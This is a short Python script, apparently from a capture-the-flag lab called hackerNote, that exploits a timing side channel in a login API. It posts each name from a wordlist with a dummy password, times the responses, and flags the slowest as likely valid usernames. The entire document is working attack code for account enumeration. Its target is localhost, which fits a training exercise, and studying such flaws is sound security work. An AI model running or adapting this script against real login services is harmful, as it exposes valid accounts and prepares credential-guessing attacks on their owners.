##Timing attack exploit on the login form for hackerNote
##Assumes you have at least ONE correct username, create an account and use that!
import requests as r
import time
import json
URL = "http://localhost:8081/api/user/login"
USERNAME_FILE = open("names.txt","r")
usernames = []
for line in USERNAME_FILE: ##Read in usernames from the wordlist
    usernames.append(line.replace("\n",""))

timings = dict()
def doLogin(user):
    creds = {"username":user,"password":"invalidPassword!"}
    response = r.post(URL,json=creds)
    if response.status_code != 200:
        print("Error:",response.status_code)
for user in usernames:
    startTime = time.time()
    doLogin(user)
    endTime = time.time()
    timings[user] = endTime - startTime ## record the time for this user along with the username
    time.sleep(0.01) ## Wait to avoid DoSing the server which causes unreliable results

print()
#print(timings)
##Longer times mean valid usernames as passwords were verified
largestTime = max(timings.values())
smallestTime = min(timings.values())
print("Time delta:",largestTime-smallestTime,"seconds")
for user, time in timings.items(): ## The longer the request took, the more likely the request is to be valid.
    if time >= largestTime * 0.9:
        ##with 10% time tolerence
        print(user,"is likely to be valid")